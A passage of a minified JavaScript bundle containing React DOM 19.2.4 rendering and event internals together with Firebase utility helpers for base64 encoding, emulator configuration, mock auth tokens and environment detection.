if(b!==h)break}b?b.parentNode.insertBefore(n,b.nextSibling):(i=s.nodeType===9?s.head:s,i.insertBefore(n,i.firstChild))}function ph(n,i){n.crossOrigin==null&&(n.crossOrigin=i.crossOrigin),n.referrerPolicy==null&&(n.referrerPolicy=i.referrerPolicy),n.title==null&&(n.title=i.title)}function mh(n,i){n.crossOrigin==null&&(n.crossOrigin=i.crossOrigin),n.referrerPolicy==null&&(n.referrerPolicy=i.referrerPolicy),n.integrity==null&&(n.integrity=i.integrity)}var Od=null;function US(n,i,s){if(Od===null){var u=new Map,h=Od=new Map;h.set(s,u)}else h=Od,u=h.get(s),u||(u=new Map,h.set(s,u));if(u.has(n))return u;for(u.set(n,null),s=s.getElementsByTagName(n),h=0;h<s.length;h++){var b=s[h];if(!(b[$n]||b[Va]||n==="link"&&b.getAttribute("rel")==="stylesheet")&&b.namespaceURI!=="http://www.w3.org/2000/svg"){var C=b.getAttribute(i)||"";C=n+C;var P=u.get(C);P?P.push(b):u.set(C,[b])}}return u}function BS(n,i,s){n=n.ownerDocument||n,n.head.insertBefore(s,i==="title"?n.querySelector("head > title"):null)}function Iq(n,i,s){if(s===1||i.itemProp!=null)return!1;switch(n){case"meta":case"title":return!0;case"style":if(typeof i.precedence!="string"||typeof i.href!="string"||i.href==="")break;return!0;case"link":if(typeof i.rel!="string"||typeof i.href!="string"||i.href===""||i.onLoad||i.onError)break;return i.rel==="stylesheet"?(n=i.disabled,typeof i.precedence=="string"&&n==null):!0;case"script":if(i.async&&typeof i.async!="function"&&typeof i.async!="symbol"&&!i.onLoad&&!i.onError&&i.src&&typeof i.src=="string")return!0}return!1}function VS(n){return!(n.type==="stylesheet"&&(n.state.loading&3)===0)}function Dq(n,i,s,u){if(s.type==="stylesheet"&&(typeof u.media!="string"||matchMedia(u.media).matches!==!1)&&(s.state.loading&4)===0){if(s.instance===null){var h=zs(u.href),b=i.querySelector(hc(h));if(b){i=b._p,i!==null&&typeof i=="object"&&typeof i.then=="function"&&(n.count++,n=zd.bind(n),i.then(n,n)),s.state.loading|=4,s.instance=b,Fa(b);return}b=i.ownerDocument||i,u=OS(u),(h=gn.get(h))&&ph(u,h),b=b.createElement("link"),Fa(b);var C=b;C._p=new Promise(function(P,V){C.onload=P,C.onerror=V}),ut(b,"link",u),s.instance=b}n.stylesheets===null&&(n.stylesheets=new Map),n.stylesheets.set(s,i),(i=s.state.preload)&&(s.state.loading&3)===0&&(n.count++,s=zd.bind(n),i.addEventListener("load",s),i.addEventListener("error",s))}}var fh=0;function wq(n,i){return n.stylesheets&&n.count===0&&Bd(n,n.stylesheets),0<n.count||0<n.imgCount?function(s){var u=setTimeout(function(){if(n.stylesheets&&Bd(n,n.stylesheets),n.unsuspend){var b=n.unsuspend;n.unsuspend=null,b()}},6e4+i);0<n.imgBytes&&fh===0&&(fh=62500*mq());var h=setTimeout(function(){if(n.waitingForImages=!1,n.count===0&&(n.stylesheets&&Bd(n,n.stylesheets),n.unsuspend)){var b=n.unsuspend;n.unsuspend=null,b()}},(n.imgBytes>fh?50:800)+i);return n.unsuspend=s,function(){n.unsuspend=null,clearTimeout(u),clearTimeout(h)}}:null}function zd(){if(this.count--,this.count===0&&(this.imgCount===0||!this.waitingForImages)){if(this.stylesheets)Bd(this,this.stylesheets);else if(this.unsuspend){var n=this.unsuspend;this.unsuspend=null,n()}}}var Ud=null;function Bd(n,i){n.stylesheets=null,n.unsuspend!==null&&(n.count++,Ud=new Map,i.forEach(Mq,n),Ud=null,zd.call(n))}function Mq(n,i){if(!(i.state.loading&4)){var s=Ud.get(n);if(s)var u=s.get(null);else{s=new Map,Ud.set(n,s);for(var h=n.querySelectorAll("link[data-precedence],style[data-precedence]"),b=0;b<h.length;b++){var C=h[b];(C.nodeName==="LINK"||C.getAttribute("media")!=="not all")&&(s.set(C.dataset.precedence,C),u=C)}u&&s.set(null,u)}h=i.instance,C=h.getAttribute("data-precedence"),b=s.get(C)||u,b===u&&s.set(null,h),s.set(C,h),this.count++,u=zd.bind(this),h.addEventListener("load",u),h.addEventListener("error",u),b?b.parentNode.insertBefore(h,b.nextSibling):(n=n.nodeType===9?n.head:n,n.insertBefore(h,n.firstChild)),i.state.loading|=4}}var bc={$$typeof:B,Provider:null,Consumer:null,_currentValue:ye,_currentValue2:ye,_threadCount:0};function _q(n,i,s,u,h,b,C,P,V){this.tag=1,this.containerInfo=n,this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.next=this.pendingContext=this.context=this.cancelPendingCommit=null,this.callbackPriority=0,this.expirationTimes=Wn(-1),this.entangledLanes=this.shellSuspendCounter=this.errorRecoveryDisabledLanes=this.expiredLanes=this.warmLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Wn(0),this.hiddenUpdates=Wn(null),this.identifierPrefix=u,this.onUncaughtError=h,this.onCaughtError=b,this.onRecoverableError=C,this.pooledCache=null,this.pooledCacheLanes=0,this.formState=V,this.incompleteTransitions=new Map}function FS(n,i,s,u,h,b,C,P,V,X,ie,se){return n=new _q(n,i,s,C,V,X,ie,se,P),i=1,b===!0&&(i|=24),b=Ht(3,null,null,i),n.current=b,b.stateNode=n,i=Jm(),i.refCount++,n.pooledCache=i,i.refCount++,b.memoizedState={element:u,isDehydrated:s,cache:i},$m(b),n}function HS(n){return n?(n=bs,n):bs}function GS(n,i,s,u,h,b){h=HS(h),u.context===null?u.context=h:u.pendingContext=h,u=Ei(i),u.payload={element:s},b=b===void 0?null:b,b!==null&&(u.callback=b),s=Si(n,u,i),s!==null&&(Mt(s,n,i),Kl(s,n,i))}function JS(n,i){if(n=n.memoizedState,n!==null&&n.dehydrated!==null){var s=n.retryLane;n.retryLane=s!==0&&s<i?s:i}}function hh(n,i){JS(n,i),(n=n.alternate)&&JS(n,i)}function QS(n){if(n.tag===13||n.tag===31){var i=Ar(n,67108864);i!==null&&Mt(i,n,67108864),hh(n,67108864)}}function WS(n){if(n.tag===13||n.tag===31){var i=Kt();i=dr(i);var s=Ar(n,i);s!==null&&Mt(s,n,i),hh(n,i)}}var Vd=!0;function kq(n,i,s,u){var h=K.T;K.T=null;var b=pe.p;try{pe.p=2,gh(n,i,s,u)}finally{pe.p=b,K.T=h}}function Nq(n,i,s,u){var h=K.T;K.T=null;var b=pe.p;try{pe.p=8,gh(n,i,s,u)}finally{pe.p=b,K.T=h}}function gh(n,i,s,u){if(Vd){var h=bh(u);if(h===null)th(n,i,u,Fd,s),$S(n,u);else if(zq(h,n,i,s,u))u.stopPropagation();else if($S(n,u),i&4&&-1<Oq.indexOf(n)){for(;h!==null;){var b=on(h);if(b!==null)switch(b.tag){case 3:if(b=b.stateNode,b.current.memoizedState.isDehydrated){var C=Jn(b.pendingLanes);if(C!==0){var P=b;for(P.pendingLanes|=2,P.entangledLanes|=2;C;){var V=1<<31-He(C);P.entanglements[1]|=V,C&=~V}po(b),(da&6)===0&&(xd=Ua()+500,dc(0))}}break;case 31:case 13:P=Ar(b,2),P!==null&&Mt(P,b,2),Pd(),hh(b,2)}if(b=bh(u),b===null&&th(n,i,u,Fd,s),b===h)break;h=b}h!==null&&u.stopPropagation()}else th(n,i,u,null,s)}}function bh(n){return n=rn(n),vh(n)}var Fd=null;function vh(n){if(Fd=null,n=Yn(n),n!==null){var i=l(n);if(i===null)n=null;else{var s=i.tag;if(s===13){if(n=c(i),n!==null)return n;n=null}else if(s===31){if(n=d(i),n!==null)return n;n=null}else if(s===3){if(i.stateNode.current.memoizedState.isDehydrated)return i.tag===3?i.stateNode.containerInfo:null;n=null}else i!==n&&(n=null)}}return Fd=n,null}function KS(n){switch(n){case"beforetoggle":case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"toggle":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 2;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 8;case"message":switch(nn()){case O:return 2;case Z:return 8;case fe:case le:return 32;case Se:return 268435456;default:return 32}default:return 32}}var yh=!1,Di=null,wi=null,Mi=null,vc=new Map,yc=new Map,_i=[],Oq="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset".split(" ");function $S(n,i){switch(n){case"focusin":case"focusout":Di=null;break;case"dragenter":case"dragleave":wi=null;break;case"mouseover":case"mouseout":Mi=null;break;case"pointerover":case"pointerout":vc.delete(i.pointerId);break;case"gotpointercapture":case"lostpointercapture":yc.delete(i.pointerId)}}function Ec(n,i,s,u,h,b){return n===null||n.nativeEvent!==b?(n={blockedOn:i,domEventName:s,eventSystemFlags:u,nativeEvent:b,targetContainers:[h]},i!==null&&(i=on(i),i!==null&&QS(i)),n):(n.eventSystemFlags|=u,i=n.targetContainers,h!==null&&i.indexOf(h)===-1&&i.push(h),n)}function zq(n,i,s,u,h){switch(i){case"focusin":return Di=Ec(Di,n,i,s,u,h),!0;case"dragenter":return wi=Ec(wi,n,i,s,u,h),!0;case"mouseover":return Mi=Ec(Mi,n,i,s,u,h),!0;case"pointerover":var b=h.pointerId;return vc.set(b,Ec(vc.get(b)||null,n,i,s,u,h)),!0;case"gotpointercapture":return b=h.pointerId,yc.set(b,Ec(yc.get(b)||null,n,i,s,u,h)),!0}return!1}function YS(n){var i=Yn(n.target);if(i!==null){var s=l(i);if(s!==null){if(i=s.tag,i===13){if(i=c(s),i!==null){n.blockedOn=i,An(n.priority,function(){WS(s)});return}}else if(i===31){if(i=d(s),i!==null){n.blockedOn=i,An(n.priority,function(){WS(s)});return}}else if(i===3&&s.stateNode.current.memoizedState.isDehydrated){n.blockedOn=s.tag===3?s.stateNode.containerInfo:null;return}}}n.blockedOn=null}function Hd(n){if(n.blockedOn!==null)return!1;for(var i=n.targetContainers;0<i.length;){var s=bh(n.nativeEvent);if(s===null){s=n.nativeEvent;var u=new s.constructor(s.type,s);wl=u,s.target.dispatchEvent(u),wl=null}else return i=on(s),i!==null&&QS(i),n.blockedOn=s,!1;i.shift()}return!0}function XS(n,i,s){Hd(n)&&s.delete(i)}function Uq(){yh=!1,Di!==null&&Hd(Di)&&(Di=null),wi!==null&&Hd(wi)&&(wi=null),Mi!==null&&Hd(Mi)&&(Mi=null),vc.forEach(XS),yc.forEach(XS)}function Gd(n,i){n.blockedOn===i&&(n.blockedOn=null,yh||(yh=!0,a.unstable_scheduleCallback(a.unstable_NormalPriority,Uq)))}var Jd=null;function ZS(n){Jd!==n&&(Jd=n,a.unstable_scheduleCallback(a.unstable_NormalPriority,function(){Jd===n&&(Jd=null);for(var i=0;i<n.length;i+=3){var s=n[i],u=n[i+1],h=n[i+2];if(typeof u!="function"){if(vh(u||s)===null)continue;break}var b=on(s);b!==null&&(n.splice(i,3),i-=3,bf(b,{pending:!0,data:h,method:s.method,action:u},u,h))}}))}function Bs(n){function i(V){return Gd(V,n)}Di!==null&&Gd(Di,n),wi!==null&&Gd(wi,n),Mi!==null&&Gd(Mi,n),vc.forEach(i),yc.forEach(i);for(var s=0;s<_i.length;s++){var u=_i[s];u.blockedOn===n&&(u.blockedOn=null)}for(;0<_i.length&&(s=_i[0],s.blockedOn===null);)YS(s),s.blockedOn===null&&_i.shift();if(s=(n.ownerDocument||n).$$reactFormReplay,s!=null)for(u=0;u<s.length;u+=3){var h=s[u],b=s[u+1],C=h[tt]||null;if(typeof b=="function")C||ZS(s);else if(C){var P=null;if(b&&b.hasAttribute("formAction")){if(h=b,C=b[tt]||null)P=C.formAction;else if(vh(h)!==null)continue}else P=C.action;typeof P=="function"?s[u+1]=P:(s.splice(u,3),u-=3),ZS(s)}}}function eC(){function n(b){b.canIntercept&&b.info==="react-transition"&&b.intercept({handler:function(){return new Promise(function(C){return h=C})},focusReset:"manual",scroll:"manual"})}function i(){h!==null&&(h(),h=null),u||setTimeout(s,20)}function s(){if(!u&&!navigation.transition){var b=navigation.currentEntry;b&&b.url!=null&&navigation.navigate(b.url,{state:b.getState(),info:"react-transition",history:"replace"})}}if(typeof navigation=="object"){var u=!1,h=null;return navigation.addEventListener("navigate",n),navigation.addEventListener("navigatesuccess",i),navigation.addEventListener("navigateerror",i),setTimeout(s,100),function(){u=!0,navigation.removeEventListener("navigate",n),navigation.removeEventListener("navigatesuccess",i),navigation.removeEventListener("navigateerror",i),h!==null&&(h(),h=null)}}}function Eh(n){this._internalRoot=n}Qd.prototype.render=Eh.prototype.render=function(n){var i=this._internalRoot;if(i===null)throw Error(o(409));var s=i.current,u=Kt();GS(s,u,n,i,null,null)},Qd.prototype.unmount=Eh.prototype.unmount=function(){var n=this._internalRoot;if(n!==null){this._internalRoot=null;var i=n.containerInfo;GS(n.current,2,null,n,null,null),Pd(),i[Kn]=null}};function Qd(n){this._internalRoot=n}Qd.prototype.unstable_scheduleHydration=function(n){if(n){var i=Pu();n={blockedOn:null,target:n,priority:i};for(var s=0;s<_i.length&&i!==0&&i<_i[s].priority;s++);_i.splice(s,0,n),s===0&&YS(n)}};var aC=e.version;if(aC!=="19.2.4")throw Error(o(527,aC,"19.2.4"));pe.findDOMNode=function(n){var i=n._reactInternals;if(i===void 0)throw typeof n.render=="function"?Error(o(188)):(n=Object.keys(n).join(","),Error(o(268,n)));return n=p(i),n=n!==null?v(n):null,n=n===null?null:n.stateNode,n};var Bq={bundleType:0,version:"19.2.4",rendererPackageName:"react-dom",currentDispatcherRef:K,reconcilerVersion:"19.2.4"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var Wd=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!Wd.isDisabled&&Wd.supportsFiber)try{ea=Wd.inject(Bq),ra=Wd}catch{}}return Cc.createRoot=function(n,i){if(!r(n))throw Error(o(299));var s=!1,u="",h=lE,b=cE,C=uE;return i!=null&&(i.unstable_strictMode===!0&&(s=!0),i.identifierPrefix!==void 0&&(u=i.identifierPrefix),i.onUncaughtError!==void 0&&(h=i.onUncaughtError),i.onCaughtError!==void 0&&(b=i.onCaughtError),i.onRecoverableError!==void 0&&(C=i.onRecoverableError)),i=FS(n,1,!1,null,null,s,u,null,h,b,C,eC),n[Kn]=i.current,ah(n),new Eh(i)},Cc.hydrateRoot=function(n,i,s){if(!r(n))throw Error(o(299));var u=!1,h="",b=lE,C=cE,P=uE,V=null;return s!=null&&(s.unstable_strictMode===!0&&(u=!0),s.identifierPrefix!==void 0&&(h=s.identifierPrefix),s.onUncaughtError!==void 0&&(b=s.onUncaughtError),s.onCaughtError!==void 0&&(C=s.onCaughtError),s.onRecoverableError!==void 0&&(P=s.onRecoverableError),s.formState!==void 0&&(V=s.formState)),i=FS(n,1,!0,i,s??null,u,h,V,b,C,P,eC),i.context=HS(null),s=i.current,u=Kt(),u=dr(u),h=Ei(u),h.callback=null,Si(s,h,u),s=u,i.current.lanes=s,cr(i,s),po(i),n[Kn]=i.current,ah(n),new Qd(i)},Cc.version="19.2.4",Cc}var dC;function Yq(){if(dC)return Ah.exports;dC=1;function a(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(a)}catch(e){console.error(e)}}return a(),Ah.exports=$q(),Ah.exports}var Xq=Yq();const Zq=()=>{};var pC={};const HA=function(a){const e=[];let t=0;for(let o=0;o<a.length;o++){let r=a.charCodeAt(o);r<128?e[t++]=r:r<2048?(e[t++]=r>>6|192,e[t++]=r&63|128):(r&64512)===55296&&o+1<a.length&&(a.charCodeAt(o+1)&64512)===56320?(r=65536+((r&1023)<<10)+(a.charCodeAt(++o)&1023),e[t++]=r>>18|240,e[t++]=r>>12&63|128,e[t++]=r>>6&63|128,e[t++]=r&63|128):(e[t++]=r>>12|224,e[t++]=r>>6&63|128,e[t++]=r&63|128)}return e},eR=function(a){const e=[];let t=0,o=0;for(;t<a.length;){const r=a[t++];if(r<128)e[o++]=String.fromCharCode(r);else if(r>191&&r<224){const l=a[t++];e[o++]=String.fromCharCode((r&31)<<6|l&63)}else if(r>239&&r<365){const l=a[t++],c=a[t++],d=a[t++],f=((r&7)<<18|(l&63)<<12|(c&63)<<6|d&63)-65536;e[o++]=String.fromCharCode(55296+(f>>10)),e[o++]=String.fromCharCode(56320+(f&1023))}else{const l=a[t++],c=a[t++];e[o++]=String.fromCharCode((r&15)<<12|(l&63)<<6|c&63)}}return e.join("")},GA={byteToCharMap_:null,charToByteMap_:null,byteToCharMapWebSafe_:null,charToByteMapWebSafe_:null,ENCODED_VALS_BASE:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",get ENCODED_VALS(){return this.ENCODED_VALS_BASE+"+/="},get ENCODED_VALS_WEBSAFE(){return this.ENCODED_VALS_BASE+"-_."},HAS_NATIVE_SUPPORT:typeof atob=="function",encodeByteArray(a,e){if(!Array.isArray(a))throw Error("encodeByteArray takes an array as a parameter");this.init_();const t=e?this.byteToCharMapWebSafe_:this.byteToCharMap_,o=[];for(let r=0;r<a.length;r+=3){const l=a[r],c=r+1<a.length,d=c?a[r+1]:0,f=r+2<a.length,p=f?a[r+2]:0,v=l>>2,y=(l&3)<<4|d>>4;let S=(d&15)<<2|p>>6,A=p&63;f||(A=64,c||(S=64)),o.push(t[v],t[y],t[S],t[A])}return o.join("")},encodeString(a,e){return this.HAS_NATIVE_SUPPORT&&!e?btoa(a):this.encodeByteArray(HA(a),e)},decodeString(a,e){return this.HAS_NATIVE_SUPPORT&&!e?atob(a):eR(this.decodeStringToByteArray(a,e))},decodeStringToByteArray(a,e){this.init_();const t=e?this.charToByteMapWebSafe_:this.charToByteMap_,o=[];for(let r=0;r<a.length;){const l=t[a.charAt(r++)],d=r<a.length?t[a.charAt(r)]:0;++r;const p=r<a.length?t[a.charAt(r)]:64;++r;const y=r<a.length?t[a.charAt(r)]:64;if(++r,l==null||d==null||p==null||y==null)throw new aR;const S=l<<2|d>>4;if(o.push(S),p!==64){const A=d<<4&240|p>>2;if(o.push(A),y!==64){const R=p<<6&192|y;o.push(R)}}}return o},init_(){if(!this.byteToCharMap_){this.byteToCharMap_={},this.charToByteMap_={},this.byteToCharMapWebSafe_={},this.charToByteMapWebSafe_={};for(let a=0;a<this.ENCODED_VALS.length;a++)this.byteToCharMap_[a]=this.ENCODED_VALS.charAt(a),this.charToByteMap_[this.byteToCharMap_[a]]=a,this.byteToCharMapWebSafe_[a]=this.ENCODED_VALS_WEBSAFE.charAt(a),this.charToByteMapWebSafe_[this.byteToCharMapWebSafe_[a]]=a,a>=this.ENCODED_VALS_BASE.length&&(this.charToByteMap_[this.ENCODED_VALS_WEBSAFE.charAt(a)]=a,this.charToByteMapWebSafe_[this.ENCODED_VALS.charAt(a)]=a)}}};class aR extends Error{constructor(){super(...arguments),this.name="DecodeBase64StringError"}}const tR=function(a){const e=HA(a);return GA.encodeByteArray(e,!0)},Tp=function(a){return tR(a).replace(/\./g,"")},JA=function(a){try{return GA.decodeString(a,!0)}catch(e){console.error("base64Decode failed: ",e)}return null};function nR(){if(typeof self<"u")return self;if(typeof window<"u")return window;if(typeof global<"u")return global;throw new Error("Unable to locate global object.")}const oR=()=>nR().__FIREBASE_DEFAULTS__,iR=()=>{if(typeof process>"u"||typeof pC>"u")return;const a=pC.__FIREBASE_DEFAULTS__;if(a)return JSON.parse(a)},rR=()=>{if(typeof document>"u")return;let a;try{a=document.cookie.match(/__FIREBASE_DEFAULTS__=([^;]+)/)}catch{return}const e=a&&JA(a[1]);return e&&JSON.parse(e)},Zp=()=>{try{return Zq()||oR()||iR()||rR()}catch(a){console.info(`Unable to get __FIREBASE_DEFAULTS__ due to: ${a}`);return}},QA=a=>Zp()?.emulatorHosts?.[a],sR=a=>{const e=QA(a);if(!e)return;const t=e.lastIndexOf(":");if(t<=0||t+1===e.length)throw new Error(`Invalid host ${e} with no separate hostname and port!`);const o=parseInt(e.substring(t+1),10);return e[0]==="["?[e.substring(1,t-1),o]:[e.substring(0,t),o]},WA=()=>Zp()?.config,KA=a=>Zp()?.[`_${a}`];class lR{constructor(){this.reject=()=>{},this.resolve=()=>{},this.promise=new Promise((e,t)=>{this.resolve=e,this.reject=t})}wrapCallback(e){return(t,o)=>{t?this.reject(t):this.resolve(o),typeof e=="function"&&(this.promise.catch(()=>{}),e.length===1?e(t):e(t,o))}}}function cl(a){try{return(a.startsWith("http://")||a.startsWith("https://")?new URL(a).hostname:a).endsWith(".cloudworkstations.dev")}catch{return!1}}async function $A(a){return(await fetch(a,{credentials:"include"})).ok}function cR(a,e){if(a.uid)throw new Error('The "uid" field is no longer supported by mockUserToken. Please use "sub" instead for Firebase Auth User ID.');const t={alg:"none",type:"JWT"},o=e||"demo-project",r=a.iat||0,l=a.sub||a.user_id;if(!l)throw new Error("mockUserToken must contain 'sub' or 'user_id' field!");const c={iss:`https://securetoken.google.com/${o}`,aud:o,iat:r,exp:r+3600,auth_time:r,sub:l,user_id:l,firebase:{sign_in_provider:"custom",identities:{}},...a};return[Tp(JSON.stringify(t)),Tp(JSON.stringify(c)),""].join(".")}const zc={};function uR(){const a={prod:[],emulator:[]};for(const e of Object.keys(zc))zc[e]?a.emulator.push(e):a.prod.push(e);return a}function dR(a){let e=document.getElementById(a),t=!1;return e||(e=document.createElement("div"),e.setAttribute("id",a),t=!0),{created:t,element:e}}let mC=!1;function YA(a,e){if(typeof window>"u"||typeof document>"u"||!cl(window.location.host)||zc[a]===e||zc[a]||mC)return;zc[a]=e;function t(S){return`__firebase__banner__${S}`}const o="__firebase__banner",l=uR().prod.length>0;function c(){const S=document.getElementById(o);S&&S.remove()}function d(S){S.style.display="flex",S.style.background="#7faaf0",S.style.position="fixed",S.style.bottom="5px",S.style.left="5px",S.style.padding=".5em",S.style.borderRadius="5px",S.style.alignItems="center"}function f(S,A){S.setAttribute("width","24"),S.setAttribute("id",A),S.setAttribute("height","24"),S.setAttribute("viewBox","0 0 24 24"),S.setAttribute("fill","none"),S.style.marginLeft="-6px"}function p(){const S=document.createElement("span");return S.style.cursor="pointer",S.style.marginLeft="16px",S.style.fontSize="24px",S.innerHTML=" &times;",S.onclick=()=>{mC=!0,c()},S}function v(S,A){S.setAttribute("id",A),S.innerText="Learn more",S.href="https://firebase.google.com/docs/studio/preview-apps#preview-backend",S.setAttribute("target","__blank"),S.style.paddingLeft="5px",S.style.textDecoration="underline"}function y(){const S=dR(o),A=t("text"),R=document.getElementById(A)||document.createElement("span"),L=t("learnmore"),x=document.getElementById(L)||document.createElement("a"),D=t("preprendIcon"),G=document.getElementById(D)||document.createElementNS("http://www.w3.org/2000/svg","svg");if(S.created){const B=S.element;d(B),v(x,L);const ee=p();f(G,D),B.append(G,R,x,ee),document.body.appendChild(B)}l?(R.innerText="Preview backend disconnected.",G.innerHTML=`<g clip-path="url(#clip0_6013_33858)">
<path d="M4.8 17.6L12 5.6L19.2 17.6H4.8ZM6.91667 16.4H17.0833L12 7.93333L6.91667 16.4ZM12 15.6C12.1667 15.6 12.3056 15.5444 12.4167 15.4333C12.5389 15.3111 12.6 15.1667 12.6 15C12.6 14.8333 12.5389 14.6944 12.4167 14.5833C12.3056 14.4611 12.1667 14.4 12 14.4C11.8333 14.4 11.6889 14.4611 11.5667 14.5833C11.4556 14.6944 11.4 14.8333 11.4 15C11.4 15.1667 11.4556 15.3111 11.5667 15.4333C11.6889 15.5444 11.8333 15.6 12 15.6ZM11.4 13.6H12.6V10.4H11.4V13.6Z" fill="#212121"/>
</g>
<defs>
<clipPath id="clip0_6013_33858">
<rect width="24" height="24" fill="white"/>
</clipPath>
</defs>`):(G.innerHTML=`<g clip-path="url(#clip0_6083_34804)">
<path d="M11.4 15.2H12.6V11.2H11.4V15.2ZM12 10C12.1667 10 12.3056 9.94444 12.4167 9.83333C12.5389 9.71111 12.6 9.56667 12.6 9.4C12.6 9.23333 12.5389 9.09444 12.4167 8.98333C12.3056 8.86111 12.1667 8.8 12 8.8C11.8333 8.8 11.6889 8.86111 11.5667 8.98333C11.4556 9.09444 11.4 9.23333 11.4 9.4C11.4 9.56667 11.4556 9.71111 11.5667 9.83333C11.6889 9.94444 11.8333 10 12 10ZM12 18.4C11.1222 18.4 10.2944 18.2333 9.51667 17.9C8.73889 17.5667 8.05556 17.1111 7.46667 16.5333C6.88889 15.9444 6.43333 15.2611 6.1 14.4833C5.76667 13.7056 5.6 12.8778 5.6 12C5.6 11.1111 5.76667 10.2833 6.1 9.51667C6.43333 8.73889 6.88889 8.06111 7.46667 7.48333C8.05556 6.89444 8.73889 6.43333 9.51667 6.1C10.2944 5.76667 11.1222 5.6 12 5.6C12.8889 5.6 13.7167 5.76667 14.4833 6.1C15.2611 6.43333 15.9389 6.89444 16.5167 7.48333C17.1056 8.06111 17.5667 8.73889 17.9 9.51667C18.2333 10.2833 18.4 11.1111 18.4 12C18.4 12.8778 18.2333 13.7056 17.9 14.4833C17.5667 15.2611 17.1056 15.9444 16.5167 16.5333C15.9389 17.1111 15.2611 17.5667 14.4833 17.9C13.7167 18.2333 12.8889 18.4 12 18.4ZM12 17.2C13.4444 17.2 14.6722 16.6944 15.6833 15.6833C16.6944 14.6722 17.2 13.4444 17.2 12C17.2 10.5556 16.6944 9.32778 15.6833 8.31667C14.6722 7.30555 13.4444 6.8 12 6.8C10.5556 6.8 9.32778 7.30555 8.31667 8.31667C7.30556 9.32778 6.8 10.5556 6.8 12C6.8 13.4444 7.30556 14.6722 8.31667 15.6833C9.32778 16.6944 10.5556 17.2 12 17.2Z" fill="#212121"/>
</g>
<defs>
<clipPath id="clip0_6083_34804">
<rect width="24" height="24" fill="white"/>
</clipPath>
</defs>`,R.innerText="Preview backend running in this workspace."),R.setAttribute("id",A)}document.readyState==="loading"?window.addEventListener("DOMContentLoaded",y):y()}function Ct(){return typeof navigator<"u"&&typeof navigator.userAgent=="string"?navigator.userAgent:""}function pR(){return typeof window<"u"&&!!(window.cordova||window.phonegap||window.PhoneGap)&&/ios|iphone|ipod|ipad|android|blackberry|iemobile/i.test(Ct())}function mR(){const a=Zp()?.forceEnvironment;if(a==="node")return!0;if(a==="browser")return!1;try{return Object.prototype.toString.call(global.process)==="[object process]"}catch{return!1}}function fR(){return typeof navigator<"u"&&navigator.userAgent==="Cloudflare-Workers"}function hR(){const a=typeof chrome=="object"?chrome.runtime:typeof browser=="object"?browser.runtime:void 0;return typeof a=="object"&&a.id!==void 0}function gR(){return typeof navigator=="object"&&navigator.product==="ReactNative"}function bR(){const a=Ct();return a.indexOf("MSIE ")>=0||a.indexOf("Trident/")>=0}function vR(){return!mR()&&!!navigator.userAgent&&navigator.userAgent.includes("Safari")&&!navigator.userAgent.includes("Chrome")}function yR(){try{return typeof indexedDB=="object"}catch{return!1}}function ER(){return new Promise((a,e)=>{try{let t=!0;const o="validate-browser-context-for-indexeddb-analytics-module",r=self.indexedDB.open(o);r.onsuccess=()=>{r.result.close(),t||self.indexedDB.deleteDatabase(o),a(!0)},r.onupgradeneeded=()=>{t=!1},r.onerror=()=>{e(r.error?.message||"")}}catch(t){e(t)}})}const SR="FirebaseError";class ni extends Error{constructor(e,t,o){super(t),this.code=e,this.customData=o,this.name=SR,Object.setPrototypeOf(this,ni.prototype),Error.captureStackTrace&&Error.captureStackTrace(this,cu.prototype.create)}}class cu{constructor(e,t,o){this.service=e,this.serviceName=t,this.errors=o}create(e,...t){const o=t[0]||{},r=`${this.service}/${e}`,l=this.errors[e],c=l?CR(l,o):"Error",d=`${this.serviceName}: ${c} (${r}).`;return new ni(r,d,o)}}function CR(a,e){return a.replace(AR,(t,o)=>{const r=e[o];return r!=null?String(r):`<${o}?>`})}const AR=/\{\$([^}]+)}/g;function TR(a){for(const e in a)if(Object.prototype.hasOwnProperty.call(a,e))return!1;return!0}function Fr(a,e){if(a===e)return!0;const t=Object.keys(a),o=Object.keys(e);for(const r of t){if(!o.includes(r))return!1;const l=a[r],c=e[r];if(fC(l)&&fC(c)){if(!Fr(l,c))return!1}else if(l!==c)return!1}for(const r of o)if(!t.includes(r))return!1;return!0}function fC(a){return a!==null&&typeof a=="object"}function uu(a){const e=[];for(const[t,o]of Object.entries(a))Array.isArray(o)?o.forEach(r=>{e.push(encodeURIComponent(t)+"="+encodeURIComponent(r))}):e.push(encodeURIComponent(t)+"="+encodeURIComponent(o));return e.length?"&"+e.join("&"):""}function wc(a){const e={};return a.replace(/^\?/,"").split("&").forEach(o=>{if(o){const[r,l]=o.split("=");e[decodeURIComponent(r)]=decodeURIComponent(l)}}),e}function Mc(a){const e=a.indexOf("?");if(!e)return"";const t=a.indexOf("#",e);return a.substring(e,t>0?t:void 0)}function xR(a,e){const t=new jR(a,e);return t.subscribe.bind(t)}class 